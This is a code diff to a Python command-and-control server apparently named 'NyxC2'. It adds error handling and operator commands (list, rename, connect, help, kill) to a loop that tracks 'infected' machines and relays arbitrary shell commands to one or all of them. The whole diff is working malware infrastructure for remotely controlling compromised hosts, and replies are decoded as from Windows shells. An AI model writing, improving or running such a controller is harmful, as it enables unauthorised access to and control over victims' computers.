@@ -37,38 +37,70 @@ def server():
                         case "rename":
                             old_name = order.strip().split(" ")[1]
                             new_name = order.strip().split(" ")[2]
-                            dict_ip[new_name] = dict_ip[old_name]
-                            del dict_ip[old_name]
+                            try:
+                                
+                                dict_ip[new_name] = dict_ip[old_name]
+                                del dict_ip[old_name]
+                            except : 
+                                print("error in your command")
+                                print("NyxC2 > ", end="", flush=True)
                             
                         case "list":
                             for infected in dict_ip:
                                 print(f"{infected}: {dict_ip[infected]}")
+                        case "connect":
+                            target = order.strip().split(" ")[1]
+                            send_message(target + " echo i'm connected", dict_ip)
+                        case "help":
+                            print("\n---  NyxC2 Master Commands  ---")
+                            print("mc list               : Show all active connected targets")
+                            print("mc rename <old> <new> : Rename a target's alias/IP")
+                            print("mc connect <target>   : Test connection to a specific target")
+                            print("mc help               : Display this help menu")
+                            print("mc kill               : close script")
+                            print("<target|*> <command>  : Send a command to target(s). * for all targets")
+                            print("------------------------------------\n")
                     
-                    
+                        case "kill":
+                            soc.close()
+                            return
                     
                     
                     
                 else:
                     send_message(command, dict_ip)
-                
+                print("NyxC2 > ", end="", flush=True)
             else:
                 nom_cible = "Inconnu"
                 for name, sock in dict_ip.items():
                     if sock == elem:
                         nom_cible = name
                         break
-                        
-                new_data = elem.recv(4096).decode('cp850', errors='replace')
-                if new_data:
+                try:
+                    new_data = elem.recv(4096)
                     
-                    
-                    print(f"\n[answer from {nom_cible}] :\n {new_data}")
-                else:
-                    print(f"connection lost with {nom_cible}")
-                    server_list.remove(elem)
+                    if not new_data:
+                        print(f"connection lost with {nom_cible}")
+                        print("\nNyxC2 > ", end="", flush=True)
+                        server_list.remove(elem)
+                        if nom_cible in dict_ip:
+                            del dict_ip[nom_cible]
+                        elem.close()
+                    else:
+                        new_data = new_data.decode('cp850', errors='replace').strip()
+                            
+                        if new_data:
+                            print(f"\n[answer from {nom_cible}] :\n {new_data}")
+                        if new_data.endswith('>'):
+                            print("\nNyxC2 > ", end="", flush=True)
+                except ConnectionResetError:
+                    print(f"connection brutally interrupted with {nom_cible}")
                     if nom_cible in dict_ip:
-                        del dict_ip[nom_cible]
+                            del dict_ip[nom_cible]
+                    server_list.remove(elem)
                     elem.close()
+                    print("NyxC2 > ", end="", flush=True)
+                    
                 
 
     soc.close()
